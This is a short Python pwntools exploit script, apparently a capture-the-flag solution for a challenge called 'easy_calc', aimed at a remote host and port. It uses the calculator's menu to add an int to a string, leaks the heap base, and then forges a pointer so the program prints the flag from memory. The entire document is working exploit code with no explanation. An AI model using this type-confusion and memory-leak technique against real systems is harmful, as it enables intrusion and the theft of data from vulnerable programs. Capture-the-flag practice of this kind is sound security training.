from pwn import *

#r = process('./easy_calc')
r = remote('106.10.34.139', 20003)

r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', '1')
r.sendafter(': ', 'int')
r.sendafter(': ', '0')
r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', '2')
r.sendafter(': ', 'string')
r.sendafter(': ', 'leak: ')
r.sendlineafter('>> ', '2')
r.sendafter(': ', 'int')
r.sendafter(': ', 'string')
r.sendafter(': ', '+')
r.sendafter(': ', 'heap leak')
r.sendlineafter('>> ', '3')
r.sendafter(': ', 'heap leak')
r.recvuntil('Value: ')
heap_base = int(r.recvline()) - 0xb0
log.info('HEAP BASE: 0x{:016x}'.format(heap_base))
flag = heap_base + 0x1b0
r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', '1')
r.sendafter(': ', 'flag addr')
r.sendafter(': ', str(flag))
r.sendlineafter('>> ', '4')
r.sendlineafter('?\n', 'no')
r.sendlineafter('>> ', '2')
r.sendafter(': ', 'string')
r.sendafter(': ', 'flag addr')
r.sendafter(': ', '+')
r.sendafter(': ', 'flag')
r.sendlineafter('>> ', '3')
r.sendafter(': ', 'flag')

r.interactive()
